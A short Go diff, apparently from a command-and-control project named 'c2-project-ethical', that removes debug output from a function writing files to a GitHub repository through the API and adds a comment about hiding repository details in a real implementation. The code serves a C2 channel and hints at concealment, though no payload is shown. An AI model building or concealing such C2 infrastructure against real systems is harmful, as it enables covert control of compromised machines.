@@ -11,6 +11,8 @@ import (
 )
 
 var GithubToken string // to be assigned at compile time using ldflags
+
+// in a real implementation you'd wanna hide repo details a little better
 const repoOwner = "SurainSaigal"
 const repoName = "c2-project-ethical"
 
@@ -61,8 +63,6 @@ func WriteFile(filePath string, prevContent string, newContent string) error {
 	}
 	jsonData, _ := json.Marshal(payload)
 
-	fmt.Println("json payload: ", string(jsonData))
-
 	req, _ := http.NewRequest("PUT", apiUrl, bytes.NewBuffer(jsonData))
 	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", GithubToken))
 	req.Header.Set("Accept", "application/vnd.github+json")
@@ -72,10 +72,6 @@ func WriteFile(filePath string, prevContent string, newContent string) error {
 		return err
 	}
 	defer updateResp.Body.Close()
-
-	fmt.Println("sent request!")
-
-	fmt.Println("full response: ", updateResp)
 
 	if updateResp.StatusCode != http.StatusOK && updateResp.StatusCode != http.StatusCreated {
 		return fmt.Errorf("failed to update: %s", updateResp.Status)
